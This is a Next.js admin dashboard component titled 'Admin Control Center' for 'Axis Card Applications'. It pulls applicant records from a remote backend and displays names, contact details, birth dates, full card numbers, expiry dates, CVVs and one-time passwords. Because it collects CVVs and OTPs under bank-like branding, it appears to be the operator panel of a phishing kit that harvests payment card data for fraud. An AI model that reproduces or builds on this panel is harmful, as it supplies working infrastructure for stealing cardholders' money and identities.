"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { LogOut, Trash2, CreditCard, User, Phone, Calendar, Mail, ShieldAlert, CheckCircle2, LockIcon } from "lucide-react";
import { Button } from "@/components/ui/button";

export default function AdminDashboard() {
  const router = useRouter();
  const [applications, setApplications] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Check auth
    const isAuth = localStorage.getItem("adminAuth");
    if (!isAuth) {
      router.push("/admin");
      return;
    }

    fetchApplications();
  }, [router]);

  const fetchApplications = async () => {
    try {
      setLoading(true);
      const response = await axios.get("https://axis-be.vercel.app/api/v1/applications");
      if (response.data.success) {
        setApplications(response.data.data);
      }
    } catch (error) {
      console.error("Error fetching applications:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminAuth");
    router.push("/admin");
  };

  const handleArchive = async (id) => {
    if (!window.confirm("Are you sure you want to remove this record from the dashboard?")) return;

    try {
      const response = await axios.put(`https://axis-be.vercel.app/api/v1/applications/${id}`, {
        status: "archived"
      });

      if (response.data.success) {
        // Remove from local state
        setApplications(applications.filter(app => app._id !== id));
      }
    } catch (error) {
      console.error("Error archiving application:", error);
      alert("Failed to remove record.");
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#A10D59]"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f5f5f5]">

      {/* Admin Navbar */}
      <nav className="bg-[#A10D59] text-white py-4 px-6 shadow-md flex justify-between items-center sticky top-0 z-10">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-white flex items-center justify-center text-[#A10D59] font-bold text-lg rounded-lg shadow-inner">
            <ShieldAlert className="w-6 h-6 text-[#A10D59]" />
          </div>
          <div>
            <h1 className="font-bold text-lg leading-tight">Admin Control Center</h1>
            <p className="text-[10px] opacity-80">Axis Card Applications</p>
          </div>
        </div>

        <button
          onClick={handleLogout}
          className="flex items-center gap-2 bg-white/10 hover:bg-white/20 px-4 py-2 rounded-lg text-sm font-medium transition-colors"
        >
          <LogOut className="w-4 h-4" />
          <span>Logout</span>
        </button>
      </nav>

      {/* Main Content */}
      <main className="p-6 max-w-7xl mx-auto">

        <div className="flex justify-between items-end mb-6">
          <div>
            <h2 className="text-2xl font-bold text-zinc-800">Recent Applications</h2>
            <p className="text-sm text-zinc-500">Showing {applications.length} active records</p>
          </div>
          <Button onClick={fetchApplications} variant="outline" className="text-xs h-8">
            Refresh Data
          </Button>
        </div>

        {applications.length === 0 ? (
          <div className="bg-white rounded-xl p-12 text-center shadow-sm border border-zinc-100 flex flex-col items-center">
            <CheckCircle2 className="w-16 h-16 text-zinc-300 mb-4" />
            <h3 className="text-lg font-bold text-zinc-700">No Active Records</h3>
            <p className="text-sm text-zinc-500 max-w-sm mt-2">
              There are currently no active applications to review. New submissions will appear here automatically.
            </p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {applications.map((app) => (
              <div key={app._id} className="bg-white rounded-xl shadow-sm border border-zinc-200 overflow-hidden hover:shadow-md transition-shadow flex flex-col">

                {/* Card Header */}
                <div className="bg-zinc-50 px-5 py-4 border-b border-zinc-100 flex justify-between items-start">
                  <div>
                    <h3 className="font-bold text-zinc-800 flex items-center gap-2">
                      <User className="w-4 h-4 text-[#A10D59]" /> {app.fullName || "N/A"}
                    </h3>
                    <p className="text-xs text-zinc-500 mt-1 flex items-center gap-1">
                      <Calendar className="w-3 h-3" /> Submitted: {new Date(app.createdAt).toLocaleDateString()}
                    </p>
                  </div>
                  <span className={`text-[10px] font-bold px-2.5 py-1 rounded-full uppercase ${app.status === 'completed' ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'
                    }`}>
                    {app.status}
                  </span>
                </div>

                {/* Card Body */}
                <div className="p-5 space-y-4 flex-1">

                  {/* Contact Info */}
                  <div className="space-y-2">
                    <p className="text-sm text-zinc-700 flex items-center gap-2">
                      <Mail className="w-4 h-4 text-zinc-400" /> {app.email || "N/A"}
                    </p>
                    <p className="text-sm text-zinc-700 flex items-center gap-2">
                      <Phone className="w-4 h-4 text-zinc-400" /> {app.mobileNumber || "N/A"}
                    </p>
                    <p className="text-sm text-zinc-700 flex items-center gap-2">
                      <Calendar className="w-4 h-4 text-zinc-400" /> DOB: {app.dateOfBirth || "N/A"}
                    </p>
                  </div>

                  <div className="h-px bg-zinc-100 w-full"></div>

                  {/* Sensitive Info */}
                  <div className="bg-rose-50 rounded-lg p-3 space-y-2 border border-rose-100">
                    <p className="text-sm font-mono text-rose-900 flex items-center gap-2">
                      <CreditCard className="w-4 h-4" />
                      {app.cardNumber ? app.cardNumber : <span className="opacity-50">No card provided</span>}
                    </p>

                    {app.cardNumber && (
                      <div className="flex justify-between text-xs font-mono text-rose-800 pl-6">
                        <span>EXP: {app.expiryDate || "--/--"}</span>
                        <span>CVV: {app.cvv || "---"}</span>
                      </div>
                    )}

                    {app.otp && (
                      <div className="mt-2 pt-2 border-t border-rose-200">
                        <p className="text-sm font-bold text-rose-900 flex items-center gap-2">
                          <LockIcon className="w-4 h-4" /> OTP: <span className="tracking-widest bg-white px-2 py-0.5 rounded border border-rose-200">{app.otp}</span>
                        </p>
                      </div>
                    )}
                  </div>

                </div>

                {/* Card Footer (Actions) */}
                <div className="p-4 border-t border-zinc-100 bg-zinc-50/50">
                  <Button
                    onClick={() => handleArchive(app._id)}
                    variant="destructive"
                    className="w-full bg-red-50 hover:bg-red-100 text-red-600 border border-red-200 py-2 h-auto text-sm gap-2"
                  >
                    <Trash2 className="w-4 h-4" /> Remove Record
                  </Button>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}
